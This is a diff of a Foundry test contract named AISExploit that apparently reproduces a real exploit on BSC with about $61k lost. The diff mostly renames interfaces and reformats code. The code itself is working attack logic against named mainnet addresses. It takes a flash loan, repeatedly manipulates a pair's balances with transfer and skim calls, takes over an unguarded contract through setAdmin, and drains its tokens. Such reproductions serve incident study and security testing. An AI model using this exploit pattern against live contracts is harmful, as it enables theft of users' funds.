@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo -- Total Lost : ~$61k
 // Frontrunner: https://bscscan.com/address/0x7cb74265e3e2d2b707122bf45aea66137c6c8891
@@ -36,9 +35,9 @@ contract AISExploit is Test {
     IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IAIS AIS = IAIS(0x6844Ef18012A383c14E9a76a93602616EE9d6132);
 
-    Uni_Pair_V3 pool = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
-    Uni_Pair_V2 usdt_ais = Uni_Pair_V2(0x1219F2699893BD05FE03559aA78e0923559CF0cf);
-    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV3Pair pool = IUniswapV3Pair(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
+    IUniswapV2Pair usdt_ais = IUniswapV2Pair(0x1219F2699893BD05FE03559aA78e0923559CF0cf);
+    IUniswapV2Router router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
     VulContract vulContract = VulContract(0xFFAc2Ed69D61CF4a92347dCd394D36E32443D9d7);
 
@@ -63,13 +62,18 @@ contract AISExploit is Test {
         emit log_named_decimal_uint("USDT profit", balanceAfter - balanceBefore, usdt.decimals());
     }
 
-    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
+    function pancakeV3FlashCallback(
+        uint256 fee0,
+        uint256,
+        /*fee1*/
+        bytes memory /*data*/
+    ) public {
         swap(3_000_000 ether, address(usdt), address(AIS));
 
         usdt_ais.skim(address(this));
         for (uint256 i = 0; i < 100; i++) {
             uint256 balance = AIS.balanceOf(address(this));
-            AIS.transfer(address(usdt_ais), balance * 90 / 100);
+            AIS.transfer(address(usdt_ais), (balance * 90) / 100);
             AIS.transfer(address(usdt_ais), 0);
             usdt_ais.skim(address(this));
             usdt_ais.skim(address(this));
@@ -78,7 +82,7 @@ contract AISExploit is Test {
         AIS.harvestMarket();
         vulContract.setAdmin(address(this));
 
-        uint256 amount = AIS.balanceOf(address(vulContract)) * 90 / 100;
+        uint256 amount = (AIS.balanceOf(address(vulContract)) * 90) / 100;
         vulContract.transferToken(address(AIS), address(this), amount);
         AIS.setSwapPairs(address(this));
 
